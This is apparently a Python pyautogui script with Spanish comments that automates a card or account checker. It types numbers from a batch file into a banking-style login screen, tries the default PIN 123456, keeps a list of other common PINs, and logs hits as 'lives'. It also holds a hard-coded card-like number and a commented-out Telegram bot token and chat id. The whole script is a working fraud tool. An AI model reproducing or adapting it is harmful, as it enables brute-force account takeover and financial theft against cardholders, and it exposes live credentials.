import pyautogui 
import time
import telegram

#bot_token = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
#chat_id = '1850445278'
#bot = telegram.Bot(token=bot_token)
# pyautogui.displayMousePosition()
posicionError = 1585, 608 #Color (255,120,0)
donde_escribir = 1735,209
lugar_clave = 1616,383
boton_siguiente = 1632,488
linealote = 0
cancelar = 1502,994
ok_error = 1641,614

#posibles_contras 
#123456
#111111
#555555
#222222
def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def buscarnumero(numero):
	image = str(numero) + '.png'
	time.sleep(0.1)
	#flag = True
	loc = None
	while loc is None:
		loc = pyautogui.locateOnScreen(image, grayscale=True, confidence=0.9)
		#print(loc)
		if loc == None:
			print("Espere1...")
			time.sleep(5)

	pyautogui.moveTo(loc)
	pyautogui.click()
	#print (loc)
def borrar():
	for i in range (1,17):
		pyautogui.press('backspace')
		
lives = open("lives.txt","a")
print("***************")
print("Presione 'Enter' para continuar")
input()

try:
	with open ('./lote.txt') as texto:
		for x in texto:

			linealote += 1
			var = False	

			click(donde_escribir)
			borrar()
			pyautogui.typewrite(x)
			time.sleep(0.1)
			click(lugar_clave)
			time.sleep(1)

			#calando del 1 al 6
			
			print(x.rstrip())
			print("Intentando 123456 ")
			for j in range (1,7):
				buscarnumero(j)
				#print(j)
			time.sleep(0.5)
			click(boton_siguiente)
			print("Verificando...")
			time.sleep(2)

			#Confirmacion : 
			b = None
			contador = 0
			#flag = "flag1"
			while (b is None) :
				contador += 1
				aceptar = "AceptarNaranja.png"
				b = pyautogui.locateOnScreen(aceptar, grayscale=True, confidence=0.9)
				#print(b)
				time.sleep(2)
				if b == None:
					time.sleep(2)
					print("Espere2...")
					#print(b)
					time.sleep(5)

					if contador > 2:
						lives.write(x.rstrip()) # escribir en el block
						lives.write("\n")

						print("Posible Live")
						#b = (759, 44, 96, 48)
						#break
						click(cancelar)

						#Reiniciando por erro
						time.sleep(1)
						click(donde_escribir)
						#time.sleep(1)
						borrar()
						#time.sleep(1)
						pyautogui.typewrite("4557880421334602")
						time.sleep(1.3)
						click(lugar_clave)
						time.sleep(1)
						for p in range (1,7):
							buscarnumero(1)
						time.sleep(1.2)
						click(boton_siguiente)
						time.sleep(1.5)
						click(ok_error)
						time.sleep(5)
						#print("creo que se acabo el bloque")
						#Box(left=1588, top=576, width=94, height=32)
						var = True
						break
						#
						sleep.time(2)
					#pyautogui.alert("mira")

			time.sleep(0.2)			
			click(b) # repitiendo bucle
			if var:
				print("Live")
			else:
				print("morida")
			print("***************\n")
			time.sleep(1)
except:
	print("error en el pograma")
	print("se quedo en la linea: ", linealote)

	lives.close()
	print("Presione 'Enter' para continuar")
	input()
	#time.sleep(4)
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para continuar")
input()



